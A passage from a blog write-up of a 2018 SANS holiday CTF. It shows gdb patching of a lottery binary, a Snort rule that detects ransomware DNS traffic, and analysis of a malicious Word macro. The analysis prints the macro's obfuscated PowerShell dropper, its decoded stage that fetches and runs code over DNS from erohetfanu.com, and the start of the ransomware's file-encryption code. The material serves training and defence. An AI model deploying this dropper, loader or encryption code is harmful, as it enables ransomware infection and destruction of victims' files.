<span class="go">   0x0000000000001516 &lt;+76&gt;:    mov    $0x1,%edi</span>
<span class="go">   0x000000000000152e &lt;+100&gt;:   imul   %edx</span>
<span class="go">   0x0000000000001530 &lt;+102&gt;:   sar    $0xc,%edx</span>
<span class="go">   0x0000000000001533 &lt;+105&gt;:   mov    %ecx,%eax</span>
<span class="go">   0x0000000000001535 &lt;+107&gt;:   sar    $0x1f,%eax</span>
<span class="go">   0x0000000000001538 &lt;+110&gt;:   sub    %eax,%edx</span>
<span class="go">   0x000000000000153a &lt;+112&gt;:   mov    %edx,%eax</span>
<span class="go">   0x000000000000153c &lt;+114&gt;:   mov    %eax,-0x4(%rbp)</span>
<span class="go">   0x000000000000153f &lt;+117&gt;:   mov    -0x4(%rbp),%eax</span>
<span class="go">   0x0000000000001542 &lt;+120&gt;:   imul   $0x2710,%eax,%eax</span>
<span class="go">   0x0000000000001548 &lt;+126&gt;:   sub    %eax,%ecx</span>
<span class="go">   0x000000000000154a &lt;+128&gt;:   mov    %ecx,%eax</span>
<span class="go">   0x000000000000154c &lt;+130&gt;:   mov    %eax,-0x4(%rbp)</span>
<span class="go">   0x000000000000154f &lt;+133&gt;:   lea    0x5856(%rip),%rdi        # 0x6dac</span>
<span class="go">   0x0000000000001556 &lt;+140&gt;:   mov    $0x0,%eax</span>
<span class="go">   0x000000000000155b &lt;+145&gt;:   callq  0x8f0 &lt;printf@plt&gt;</span>
<span class="go">   0x0000000000001560 &lt;+150&gt;:   mov    -0x4(%rbp),%eax</span>
<span class="go">   0x0000000000001563 &lt;+153&gt;:   mov    %eax,%esi</span>
<span class="go">   0x0000000000001565 &lt;+155&gt;:   lea    0x5858(%rip),%rdi        # 0x6dc4</span>
<span class="go">   0x000000000000156c &lt;+162&gt;:   mov    $0x0,%eax</span>
<span class="go">   0x0000000000001571 &lt;+167&gt;:   callq  0x8f0 &lt;printf@plt&gt;</span>
<span class="go">   0x0000000000001576 &lt;+172&gt;:   lea    0x584a(%rip),%rdi        # 0x6dc7</span>
<span class="go">   0x000000000000157d &lt;+179&gt;:   callq  0x910 &lt;puts@plt&gt;</span>
<span class="hll"><span class="go">   0x0000000000001582 &lt;+184&gt;:   cmpl   $0x4c9,-0x4(%rbp)</span>
</span><span class="go">   0x0000000000001589 &lt;+191&gt;:   jne    0x1597 &lt;main+205&gt;</span>
<span class="go">   0x000000000000158b &lt;+193&gt;:   mov    $0x0,%eax</span>
<span class="go">   0x0000000000001590 &lt;+198&gt;:   callq  0xfd7 &lt;winnerwinner&gt;</span>
<span class="go">   0x0000000000001595 &lt;+203&gt;:   jmp    0x15a1 &lt;main+215&gt;</span>
<span class="go">   0x0000000000001597 &lt;+205&gt;:   mov    $0x0,%eax</span>
<span class="go">   0x000000000000159c &lt;+210&gt;:   callq  0x14b7 &lt;sorry&gt;</span>
<span class="go">   0x00000000000015a1 &lt;+215&gt;:   mov    $0x0,%edi</span>
<span class="go">   0x00000000000015a6 &lt;+220&gt;:   callq  0x920 &lt;exit@plt&gt;</span>
<span class="go">End of assembler dump.</span>
</pre></div>
<p>At the highlighted line, we can see that the value of <code>$rbp - 0x4</code> is
compared to 0x4c9. This hex value in decimal is 1225, which is the winning
value of the lottery. So this is the comparison that is made between the
winning ticket and our randomly drawn ticket. If they're different, the
program jumps to <code>main+205</code> and calls the function <code>sorry</code>. If
they're equal, it continues and calls <code>winnerwinner</code>.</p>
<p>Let's put a breakpoint on this comparison, and run the program:</p>
<div class="highlight"><pre><span></span><span class="go">(gdb) b *(main+184)</span>
<span class="go">Breakpoint 1 at 0x1582</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /home/elf/sleighbell-lotto</span>
<span class="go">[Thread debugging using libthread_db enabled]</span>
<span class="go">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span>

<span class="go">The winning ticket is number 1225.</span>
<span class="go">Rolling the tumblers to see what number you&#39;ll draw...</span>

<span class="go">You drew ticket number 8093!</span>


<span class="go">Breakpoint 1, 0x0000555555555582 in main ()</span>
</pre></div>
<p>Now, we're just before the comparison of our (losing) ticket to 1225. Several
options are available. We can directly jump to the call of
<code>winnerwinner</code>:</p>
<div class="highlight"><pre><span></span><span class="go">(gdb) j *(main+198)</span>
<span class="go">Continuing at 0x555555555590.</span>
<span class="go">[snip]</span>
<span class="go">Congratulations! You&#39;ve won, and have successfully completed this challenge.</span>
<span class="go">[Inferior 1 (process 46) exited normally]</span>
</pre></div>
<p>We can also directly modify the memory, so that our ticket has the winning
value:</p>
<div class="highlight"><pre><span></span><span class="go">(gdb) x/d ($rbp-0x4)</span>
<span class="go">0x7fffffffe5fc: 8093</span>
<span class="go">(gdb) set *((int *) ($rbp-0x4)) = 1225</span>
<span class="go">(gdb) continue</span>
<span class="go">Continuing.</span>
<span class="go">[snip]</span>
<span class="go">Congratulations! You&#39;ve won, and have successfully completed this challenge.</span>
<span class="go">[Inferior 1 (process 40) exited normally]</span>
</pre></div>
<p>I'm sure there are many more ways to win this lottery, and look forward to read
about them in other write-ups!</p>
</div>
</div>
<div class="section" id="snort-rule">
<h3><a class="toc-backref" href="#id40">Snort Rule</a></h3>
<p>In Santa's secret room, we find Alabaster, who is in need of help:</p>
<img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" />
<p><em>Alabaster says</em></p>
<blockquote>
<p>Help, all of our computers have been encrypted by ransomware!</p>
<p>I came here to help but got locked in 'cause I dropped my &quot;Alabaster
Snowball&quot; badge in a rush.</p>
<p>I started analyzing the ransomware on my host operating system, ran it by
accident, and now my files are encrypted!</p>
<p>Unfortunately, the password database I keep on my computer was encrypted,
so now I don't have access to any of our systems.</p>
<p>If only there were some way I could create some kind of traffic filter that
could alert anytime ransomware was found!</p>
</blockquote>
<p>So, we must stop the ransomware traffic, using the Snort terminal:</p>
<div class="highlight"><pre><span></span><span class="go">  _  __     _             _       _____          _   _</span>
<span class="go"> | |/ /    (_)           | |     / ____|        | | | |</span>
<span class="go"> | &#39; / _ __ _ _ __   __ _| | ___| |     __ _ ___| |_| | ___</span>
<span class="go"> |  &lt; | &#39;__| | &#39;_ \ / _` | |/ _ \ |    / _` / __| __| |/ _ \</span>
<span class="go"> | . \| |  | | | | | (_| | |  __/ |___| (_| \__ \ |_| |  __/</span>
<span class="go"> |_|\_\_|  |_|_|_|_|\__, |_|\___|\_____\__,_|___/\__|_|\___|</span>
<span class="go">             / ____| __/ |          | |</span>
<span class="go">            | (___  |___/  ___  _ __| |_</span>
<span class="go">             \___ \| &#39;_ \ / _ \| &#39;__| __|</span>
<span class="go">             ____) | | | | (_) | |  | |_</span>
<span class="go">            |_____/|_|_|_|\___/|_|_  \__|</span>
<span class="go">               |_   _|  __ \ / ____|</span>
<span class="go">                 | | | |  | | (___</span>
<span class="go">         _____   | | | |  | |\___ \        __</span>
<span class="go">        / ____| _| |_| |__| |____) |      /_ |</span>
<span class="go">       | (___  |_____|_____/|_____/ _ __   | |</span>
<span class="go">        \___ \ / _ \ &#39;_ \/ __|/ _ \| &#39;__|  | |</span>
<span class="go">        ____) |  __/ | | \__ \ (_) | |     | |</span>
<span class="go">       |_____/ \___|_| |_|___/\___/|_|     |_|</span>
<span class="go">============================================================</span>
<span class="go">INTRO:</span>
<span class="go">  Kringle Castle is currently under attacked by new piece of</span>
<span class="go">  ransomware that is encrypting all the elves files. Your</span>
<span class="go">  job is to configure snort to alert on ONLY the bad</span>
<span class="go">  ransomware traffic.</span>
<span class="go">GOAL:</span>
<span class="go">  Create a snort rule that will alert ONLY on bad ransomware</span>
<span class="go">  traffic by adding it to snorts /etc/snort/rules/local.rules</span>
<span class="go">  file. DNS traffic is constantly updated to snort.log.pcap</span>
<span class="go">COMPLETION:</span>
<span class="go">  Successfully create a snort rule that matches ONLY</span>
<span class="go">  bad DNS traffic and NOT legitimate user traffic and the</span>
<span class="go">  system will notify you of your success.</span>

<span class="go">  Check out ~/more_info.txt for additional information.</span>
<span class="gp">elf@4a4351a6045e:~$</span> cat more_info.txt
<span class="go">MORE INFO:</span>
<span class="go">  A full capture of DNS traffic for the last 30 seconds is</span>
<span class="go">  constantly updated to:</span>
<span class="go">  /home/elf/snort.log.pcap</span>
<span class="go">  You can also test your snort rule by running:</span>
<span class="go">  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf</span>
<span class="go">  This will create an alert file at ~/snort_logs/alert</span>
<span class="go">  This sensor also hosts an nginx web server to access the</span>
<span class="go">  last 5 minutes worth of pcaps for offline analysis. These</span>
<span class="go">  can be viewed by logging into:</span>
<span class="go">  http://snortsensor1.kringlecastle.com/</span>
<span class="go">  Using the credentials:</span>
<span class="go">  ----------------------</span>
<span class="go">  Username | elf</span>
<span class="go">  Password | onashelf</span>
<span class="go">  tshark and tcpdump have also been provided on this sensor.</span>
<span class="go">HINT:</span>
<span class="go">  Malware authors often user dynamic domain names and</span>
<span class="go">  IP addresses that change frequently within minutes or even</span>
<span class="go">  seconds to make detecting and block malware more difficult.</span>
<span class="go">  As such, its a good idea to analyze traffic to find patterns</span>
<span class="go">  and match upon these patterns instead of just IP/domains.</span>
</pre></div>
<p>We must create a rule that will match all the ransomware's traffic, and won't
match the legitimate users' traffic. We're given access to a website which
contains PCAP files with the DNS traffic of the last five minutes.</p>
<p>Let's download some of these PCAP files and see if we can find a common
pattern.  You can use KringleCastle's website, mentioned herebefore, or you can
download some of the PCAP files I had during the challenge:</p>
<ul class="simple">
<li><a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631032.853224.pcap">snort.log.1546631032.853224.pcap</a></li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631066.7843747.pcap">snort.log.1546631066.7843747.pcap</a></li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2018/snort.log.1546631107.349513.pcap">snort.log.1546631107.349513.pcap</a></li>
</ul>
<p>If we open these PCAP files, we see exclusively TXT DNS traffic. However, you
notice rapidly that some of these domains don't seem legitimate. Some of the
requests made interrogate a weird looking domain, with some sort of hash as a
part of the subdomain, and the TXT answers are extremely long. This is clearly
very fishy, and we can easily guess that this is our ransomware traffic.</p>
<p>However, we can't use the source IP address, the destination IP address, or the
domain name as <a class="reference external" href="https://en.wikipedia.org/wiki/Indicator_of_compromise">IOCs</a>,
because they never stay the same. The only constant seems to be this hash,
<code>77616E6E61636F6F6B69652E6D696E2E707331</code>, which is part of the subdomain.</p>
<p>Let's create a Snort rule that will trigger an alert every time we see this
hash. I used <a class="reference external" href="https://resources.infosecinstitute.com/snort-rules-workshop-part-one/">this website</a>
and StackOverflow to determine how to do so:</p>
<div class="highlight"><pre><span></span>alert udp any any -&gt; any any (msg:&quot;Ransomware trafic detected&quot;; pcre:&quot;/77616E6E61636F6F6B69652E6D696E2E707331/&quot;; metadata:service dns; sid:1337; rev:3;)
</pre></div>
<p>Here's what it means:</p>
<ul class="simple">
<li><code>alert</code>: create an alert when this rule matches</li>
<li><code>udp</code>: we only care about UDP traffic</li>
<li><code>any any -&gt; any any</code>: we look at traffic from any source to any
destination. I tried to do some fine tuning here, but I didn't catch every
traffic, only the requests made by the ransomware (and not the answers from
the server). This is likely overkill and wouldn't work in a true production
environment.</li>
<li><code>msg</code>: the message that will be displayed in our alert</li>
<li><code>pcre:&quot;/77616E6E61636F6F6B69652E6D696E2E707331/&quot;</code>: our alert will only
be triggered if it matches this regex. Here, it's a pretty simple regex that
only looks if the IOC hash is in the traffic.</li>
<li><code>metadata</code>: the UDP traffic is DNS</li>
<li><code>sid</code>, <code>rev</code>: id and revision number of the rule</li>
</ul>
<p>Let's add this rule at the end of our rule file:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@7a674ac839a9:~$</span> <span class="nb">echo</span> -e <span class="s1">&#39;\nalert udp any any -&gt; any any (msg:&quot;Ransomware trafic detected&quot;; pcre:&quot;/77616E6E61636F6F6B69652E6D696E2E707331/&quot;; metadata:service dns; sid:1337; rev:3;)&#39;</span> &gt;&gt; /etc/snort/rules/local.rules
<span class="gp">elf@7a674ac839a9:~$</span>
<span class="hll"><span class="go">[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!</span>
</span></pre></div>
<p>Alright, we now have an alert every time the ransomware generates traffic.</p>
</div>
<div class="section" id="malware-dropper">
<h3><a class="toc-backref" href="#id41">Malware Dropper</a></h3>
<p>Now that the ransomware traffic is stopped, Alabaster gives us an archive,
which, he supposes, is the initial dropper for the ransomware. We must find
the domain it communicates with.</p>
<img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" />
<p><em>Alabaster says</em></p>
<blockquote>
<p>Thank you so much! Snort IDS is alerting on each new ransomware infection
in our network.</p>
<p>Hey, you're pretty good at this security stuff. Could you help me further
with what I suspect is a malicious Word document?</p>
<p>All the elves were emailed a cookie recipe right before all the infections.
Take <a class="reference external" href="/docs/sans-christmas-challenge-2018/CHOCOLATE_CHIP_COOKIE_RECIPE.zip">this document</a>
with a password of <strong>elves</strong> and find the domain it communicates with.</p>
</blockquote>
<p>So, let's extract this archive:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> 7z -pelves x CHOCOLATE_CHIP_COOKIE_RECIPE.zip

<span class="go">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span>
<span class="go">p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)</span>

<span class="go">Scanning the drive for archives:</span>
<span class="go">1 file, 110699 bytes (109 KiB)</span>

<span class="go">Extracting archive: CHOCOLATE_CHIP_COOKIE_RECIPE.zip</span>
<span class="go">--</span>
<span class="go">Path = CHOCOLATE_CHIP_COOKIE_RECIPE.zip</span>
<span class="go">Type = zip</span>
<span class="go">Physical Size = 110699</span>

<span class="go">Everything is Ok</span>

<span class="go">Size:       113540</span>
<span class="go">Compressed: 110699</span>
<span class="gp">$</span>  ls -lh
<span class="go">total 228K</span>
<span class="hll"><span class="go">-rw-r--r-- 1 useless useless 111K déc.  17 18:46 CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span>
</span><span class="go">-rw-r--r-- 1 useless useless 109K déc.  18 04:17 CHOCOLATE_CHIP_COOKIE_RECIPE.zip</span>
</pre></div>
<p>Alright, it's a <code>.docm</code> file. This is probably a Microsoft Office file
with a malicious macro that will download and execute the malware. Let's open
it <strong>with extra care not to execute the macro</strong>.</p>
<p>For those of you who only want the chocolate chip cookie recipe, you can find
it <a class="reference external" href="#appendix-chocolate-chip-cookie-recipe">in the appendix</a>.</p>
<p>If we take a look at the macros in this Office file, we can see that two
functions, <code>Document_Open</code> and <code>AutoOpen</code> were created:</p>
<img alt="libreoffice_macro_docm.png" class="align-center" src="/images/sans-christmas-challenge-2018/libreoffice_macro_docm.png" />
<p><em>(Yes, it's LibreOffice, sue me)</em></p>
<p>These functions are designed to be executed as soon as the document is open.
Let's take a look at the source code of these functions:</p>
<div class="highlight"><pre><span></span>Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
Dim cmd As String
<span class="hll">cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
</span>Shell cmd
End Sub
</pre></div>
<p>As soon as the document gets opened, a (quite ugly) PowerShell command is
executed. We can see from the source code that there is some base64-encoding,
and some compressing. Instead of doing the analysis manually, we'll use
PowerShell to execute the command. <strong>But</strong> in order <strong>not to get infected
ourselves</strong>, we'll replace every occurrence of <code>IEX</code> (or
<code>Invoke-Expression</code>) by a <code>Write-Output</code>. This way, the source
code will be displayed instead of being executed.</p>
<p>So, let's see what this PowerShell gibberish means:</p>
<div class="highlight"><pre><span></span><span class="gp">PS C:\Users\admin&gt; </span><span class="n">sal</span> <span class="n">a</span> <span class="nb">New-Object</span><span class="p">;</span> <span class="nb">Write-Output</span> <span class="p">(</span><span class="n">a</span> <span class="n">IO</span><span class="p">.</span><span class="n">StreamReader</span><span class="p">((</span><span class="n">a</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">DeflateStream</span><span class="p">(</span><span class="no">[IO.MemoryStream][Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;</span><span class="p">),</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">)),</span><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">)).</span><span class="n">ReadToEnd</span><span class="p">()</span>
<span class="go">function H2A($a) {$o; $a -split &#39;(..)&#39; | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = &quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;; $h = &quot;&quot;; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name &quot;$f.erohetfanu.com&quot; -Type TXT).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name &quot;$i.$f.erohetfanu.com&quot; -Type TXT).strings}; iex($(H2A $h | Out-string))</span>
</pre></div>
<p>Alright, we get a weird function, <code>H2A</code>, which is making DNS request to
a domain name <code>erohetfanu.com</code>. That's the domain we're looking for.</p>
</div>
<div class="section" id="malware-analysis">
<h3><a class="toc-backref" href="#id42">Malware Analysis</a></h3>
<p>Alabaster wonders if the malware uses a killswitch domain, <em>à la WannaCry</em>.</p>
<img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" />
<p><em>Alabaster says</em></p>
<blockquote>
<p>Erohetfanu.com, I wonder what that means?</p>
<p>Unfortunately, Snort alerts show multiple domains, so blocking that one
won't be effective.</p>
<p>I remember another ransomware in recent history had a killswitch domain
that, when registered, would prevent any further infections.</p>
<p>Perhaps there is a mechanism like that in this ransomware? Do some more
analysis and see if you can find a fatal flaw and activate it!</p>
</blockquote>
<p>Let's analyze the ransomware and see what we can find. First of all, let's
get the source code of the malware. Let's execute the command we found in the
previous question, <strong>without</strong> executing <code>IEX</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">PS E:\sans-christmas-challenge-2018&gt; </span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">};</span> <span class="k">return</span> <span class="nv">$o</span><span class="p">};</span> <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span><span class="p">;</span> <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iin</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">)){</span><span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">};</span> <span class="p">$(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">)</span>
<span class="go">$functions = {function e_d_file($key, $File, $enc_it) {[byte[]]$key = $key;$Suffix = &quot;`.wannacookie&quot;;[System.Reflection.Assembly]::LoadWithPartialName(&#39;System.Security.Cryptography&#39;);[System.Int32]$KeySize = $key.Length*8;$AESP = New-Object &#39;System.Security.Cryptography.AesManaged&#39;;$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AESP.BlockSize = 128;$AESP.KeySize = $KeySize;$AESP.Key = $key;$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);if ($enc_it) {$DestFile = $File + $Suffix} else {$DestF[snip]</span>
</pre></div>
<p>Wow, we get a lot of minified code. Let's make it a little bit more readable.
Here's the full source code of the malware. I just added carriage-returns
after every <code>}</code>, <code>;</code>, and indented the code:</p>
<div class="highlight"><pre><span></span><span class="nv">$functions</span> <span class="p">=</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">e_d_file</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
        <span class="no">[byte[]]</span><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">;</span>
        <span class="nv">$Suffix</span> <span class="p">=</span> <span class="s2">&quot;`.wannacookie&quot;</span><span class="p">;</span>
        <span class="no">[System.Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Security.Cryptography&#39;</span><span class="p">);</span>
        <span class="no">[System.Int32]</span><span class="nv">$KeySize</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">*</span><span class="n">8</span><span class="p">;</span>
        <span class="nv">$AESP</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="s1">&#39;System.Security.Cryptography.AesManaged&#39;</span><span class="p">;</span>
        <span class="nv">$AESP</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.CipherMode]</span><span class="p">::</span><span class="n">CBC</span><span class="p">;</span>
        <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="n">128</span><span class="p">;</span>
        <span class="nv">$AESP</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="nv">$KeySize</span><span class="p">;</span>
        <span class="nv">$AESP</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">;</span>
        <span class="nv">$FileSR</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$File</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Open</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$DestFile</span> <span class="p">=</span> <span class="nv">$File</span> <span class="p">+</span> <span class="nv">$Suffix</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$DestFile</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$File</span> <span class="o">-replace</span> <span class="nv">$Suffix</span><span class="p">)</span>
        <span class="p">};</span>
        <span class="nv">$FileSW</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$DestFile</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Create</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$AESP</span><span class="p">.</span><span class="n">GenerateIV</span><span class="p">();</span>
            <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span> <span class="n">0</span><span class="p">,</span> <span class="n">4</span><span class="p">);</span>
            <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateEncryptor</span><span class="p">()</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="no">[Byte[]]</span><span class="nv">$LenIV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="n">4</span><span class="p">;</span>
            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span>
            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">,</span> <span class="n">3</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span>
            <span class="no">[Int]</span><span class="nv">$LIV</span> <span class="p">=</span> <span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$LenIV</span><span class="p">,</span>  <span class="n">0</span><span class="p">);</span>
            <span class="no">[Byte[]]</span><span class="nv">$IV</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$LIV</span><span class="p">;</span>
            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="n">4</span><span class="p">,</span> <span class="no">[System.IO.SeekOrigin]</span><span class="p">::</span><span class="k">Begin</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span>
            <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$IV</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$LIV</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-Null</span><span class="p">;</span>
            <span class="nv">$AESP</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="nv">$IV</span><span class="p">;</span>
            <span class="nv">$Transform</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">()</span>
        <span class="p">};</span>
        <span class="nv">$CryptoS</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">CryptoStream</span><span class="p">(</span><span class="nv">$FileSW</span><span class="p">,</span> <span class="nv">$Transform</span><span class="p">,</span> <span class="no">[System.Security.Cryptography.CryptoStreamMode]</span><span class="p">::</span><span class="n">Write</span><span class="p">);</span>
        <span class="no">[Int]</span><span class="nv">$Count</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
